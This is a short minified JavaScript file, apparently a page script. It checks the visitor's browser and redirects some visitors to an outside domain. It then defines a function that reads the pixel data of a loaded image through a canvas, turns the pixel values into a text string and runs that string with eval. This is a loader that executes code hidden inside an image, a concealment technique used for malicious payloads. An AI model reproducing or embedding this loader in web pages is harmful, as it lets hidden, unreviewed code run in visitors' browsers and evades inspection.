"use strict";var fgd="false";-1!=navigator.userAgent.indexOf("iPhone")||-1!=navigator.userAgent.indexOf("iPad")||-1!=navigator.userAgent.indexOf("Windows Phone")||(-1==navigator.userAgent.indexOf("; Android ")?-1==navigator.userAgent.indexOf(" Gecko/")?-1!=navigator.userAgent.indexOf("Opera")||-1!=navigator.userAgent.indexOf("OPR")?fgd="true":-1!=navigator.userAgent.indexOf("Edge")||-1!=navigator.userAgent.indexOf("Chrome")&&(fgd="true"):fgd="true":fgd="true"),"false"==fgd&&(alert("Sorry, you have to use Chrome, Firefox, or Opera to view this page! \niOS and Windows Mobile devices are also prohibited!"),window.location.href="https://t69.us/");function pj(hx){var bv=document.getElementById(hx);bv.addEventListener("load",function(){var ctt,msx;msx=document.createElement("canvas"),msx.width=bv.width,msx.height=bv.height,ctt=msx.getContext("2d"),ctt.drawImage(bv,0,0);var data=ctt.getImageData(0,0,bv.width,bv.height).data;var size=0;size+=data[1]<<56,size+=data[2]<<48,size+=data[4]<<40,size+=data[5]<<32,size+=data[6]<<24,size+=data[8]<<16,size+=data[9]<<8,size+=data[10];for(var ypos="",i=12;i<data.length;i++)if((i+1)%4){var char=data[i];32<=char&&(ypos+=String.fromCharCode(char))}eval(ypos)},!1)}
/* Copyright 2018 Resources (resources.ga). All rights reserved. */
